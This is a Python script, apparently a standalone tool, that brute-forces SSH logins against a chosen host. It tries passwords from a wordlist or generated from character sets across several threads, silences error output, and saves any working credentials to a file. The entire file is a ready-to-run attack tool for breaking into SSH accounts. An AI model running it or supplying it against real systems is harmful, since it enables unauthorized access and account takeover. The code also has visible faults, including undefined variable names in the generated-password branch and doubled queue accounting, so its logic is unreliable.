import paramiko
import socket
import time
import argparse
import threading
import queue
import itertools
import string
import sys
import contextlib
import os
from colorama import init, Fore

# Initialize Colorama for colored output
init()

# --- Context manager to suppress stderr ---
@contextlib.contextmanager
def no_stderr():
    with open(os.devnull, "w") as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

# --- Global Queue and Lock for thread-safe operations ---
q = queue.Queue()
found_combo = False
lock = threading.Lock() # To protect the found_combo flag and print statements

# --- Function to generate passwords ---
def generate_passwords(chars, min_length, max_length):
    for length in range(min_length, max_length + 1):
        for combo in itertools.product(chars, repeat=length):
            yield "".join(combo)

# --- SSH Connection Attempt Function (modified for advanced version) ---
def ssh_connect(hostname, username, password):
    global found_combo # Declare as global to modify the flag
    
    # If a combo is already found by another thread, stop trying
    with lock:
        if found_combo:
            q.task_done() # Mark task as done even if not processed fully
            return False

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Suppress paramiko's default stderr output for cleaner console
    with no_stderr():
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
            with lock: # Acquire lock before printing and modifying global state
                print(f"{Fore.GREEN}[+] Found Combo: {username}@{hostname}:{password}{Fore.RESET}")
                with open("credentials.txt", "a") as f:
                    f.write(f"{username}@{hostname}:{password}\n")
                found_combo = True # Set flag to stop other threads
            q.task_done()
            return True
        except paramiko.AuthenticationException:
            with lock: # Acquire lock before printing
                if not found_combo: # Only print if a combo hasn't been found yet by another thread
                    print(f"[-] Invalid Combo: {username}@{hostname}:{password}")
            q.task_done()
            return False
        except socket.timeout:
            with lock: # Acquire lock before printing
                if not found_combo:
                    print(f"[-] Host: {hostname} Timeout for {username} with {password}")
            q.task_done()
            return False
        except paramiko.SSHException as e:
            with lock: # Acquire lock before printing
                if not found_combo:
                    print(f"[-] SSH Error for {username}@{hostname}:{password}: {e}")
            time.sleep(1) # Add a small delay for SSH errors
            q.task_done()
            return False
        except Exception as e:
            with lock: # Acquire lock before printing
                if not found_combo:
                    print(f"[-] General Error for {username}@{hostname} with {password}: {e}")
            q.task_done()
            return False
        finally:
            client.close()

# --- Worker function for threads ---
def worker():
    global found_combo
    while not found_combo: # Keep working until a combo is found or queue is empty
        try:
            password = q.get(timeout=1) # Get task from queue, with timeout to check found_combo
            ssh_connect(hostname_global, username_global, password)
        except queue.Empty:
            if not found_combo: # If queue is empty and no combo found, thread can exit
                break
        except Exception as e:
            with lock:
                print(f"{Fore.RED}[!] Worker error: {e}{Fore.RESET}")
            q.task_done() # Mark task as done even on error

# --- Main function to set up and start brute-force ---
def main():
    global hostname_global, username_global # Declare globals used by worker function

    parser = argparse.ArgumentParser(description="Advanced Multi-threaded SSH Brute-Forcer")
    parser.add_argument("host", help="Target Hostname or IP Address")
    parser.add_argument("-u", "--username", required=True, help="Single Username to test")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    
    # Group for password options
    password_group = parser.add_mutually_exclusive_group(required=True)
    password_group.add_argument("-p", "--passlist", help="Path to Password List file")
    password_group.add_argument("-g", "--generate", nargs=3, metavar=('CHARS', 'MIN_LEN', 'MAX_LEN'),
                                help="Generate passwords: CHARS MIN_LEN MAX_LEN (e.g., 'a-z0-9' 4 6)")

    args = parser.parse_args()

    hostname_global = args.host
    username_global = args.username
    num_threads = args.threads

    # --- Handle password list or generation ---
    if args.passlist:
        try:
            with open(args.passlist, "r") as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Error: Password list file '{args.passlist}' not found.{Fore.RESET}")
            return
    elif args.generate:
        chars_str, min_len_str, max_len_str = args.generate
        try:
            min_len = int(min_len_str)
            max_len = int(max_len_str)
            if min_len <= 0 or max_len <= 0 or min_len > max_len:
                raise ValueError("Lengths must be positive and MIN_LEN <= MAX_LEN")
        except ValueError as e:
            print(f"{Fore.RED}[!] Invalid length arguments for generation: {e}{Fore.RESET}")
            return

        # Handle common character sets
        chars = ""
        if 'a-z' in chars_str: chars += string.ascii_lowercase
        if 'A-Z' in chars_str: chars += string.ascii_uppercase
        if '0-9' in chars_str: chars += string.digits
        if '!@#' in chars_str: chars += "!@#$%^&*()_+-=[]{}|;:'\",.<>/?`~" # Common special chars
        # Add other specific characters if present in chars_str but not in standard sets
        for char in chars_str:
            if char not in string.ascii_lowercase and char not in string.ascii_uppercase and char not in string.digits and char not in "!@#$%^&*()_+-=[]{}|;:'\",.<>/?`~":
                chars += char
        
        if not chars:
            print(f"{Fore.RED}[!] No valid characters specified for password generation.{Fore.RESET}")
            return

        print(f"[!] Generating passwords from '{chars}' (length {min_len}-{max_len}). This may take time for longer lengths.")
        passwords = generate_passwords(chars, min_len, max_len) # This is a generator

    # --- Populate the queue with passwords ---
    # For generated passwords, we put them one by one.
    # For list passwords, they are already in a list.
    if isinstance(passwords, list):
        for pwd in passwords:
            q.put(pwd)
        print(f"[!] Starting brute-force on {hostname_global} for user {username_global} with {len(passwords)} passwords using {num_threads} threads...")
    else: # It's a generator
        # Generators don't have a len, so we'll just start.
        # Max combinations can be huge, so we don't count them upfront.
        print(f"[!] Starting brute-force on {hostname} for user {username} with generated passwords using {num_threads} threads...")
        # Put first batch of generated passwords to get threads started
        # The worker will keep trying to get from the queue. We don't pre-populate all.
        # This approach with a generator works better if you continuously feed the queue.
        # For simplicity of this example, let's pre-populate for generated too, but warn.
        # In a very large scale, a separate producer thread would feed the queue.
        
        # --- Adjusted strategy for generators: we'll feed a reasonable number initially ---
        # and rely on the worker loop's `q.get(timeout=1)` to eventually break.
        # For simpler flow, let's convert generated passwords to a list for now,
        # but for truly massive sets, a producer thread would be better.
        # For this example, we'll iterate the generator into a list to know total count.
        
        # NOTE: For *very* large generated password sets, converting to a list
        # will consume a lot of memory. The ideal is a producer-consumer model
        # with a separate thread continuously adding to the queue.
        # For typical small-to-medium range brute-forcing, this is fine.
        all_generated_passwords = list(passwords) # Convert generator to list for len()
        for pwd in all_generated_passwords:
            q.put(pwd)
        print(f"[!] Starting brute-force on {hostname} for user {username} with {len(all_generated_passwords)} generated passwords using {num_threads} threads...")
        if len(all_generated_passwords) > 1000000: # Warn for very large sets
             print(f"{Fore.YELLOW}[!] Warning: Generating a very large number of passwords ({len(all_generated_passwords)}). This might consume a lot of memory.{Fore.RESET}")


    # --- Create and start worker threads ---
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, daemon=True) # daemon=True ensures threads exit with main program
        threads.append(thread)
        thread.start()

    # Wait for all tasks to be done or a combo to be found
    q.join() # Blocks until all items in the queue have been gotten and processed.

    if found_combo:
        print(f"{Fore.GREEN}[***] Brute-force complete! Found valid credentials.{Fore.RESET}")
    else:
        print(f"{Fore.RED}[---] Brute-force finished. No valid credentials found.{Fore.RESET}")

if __name__ == "__main__":
    main()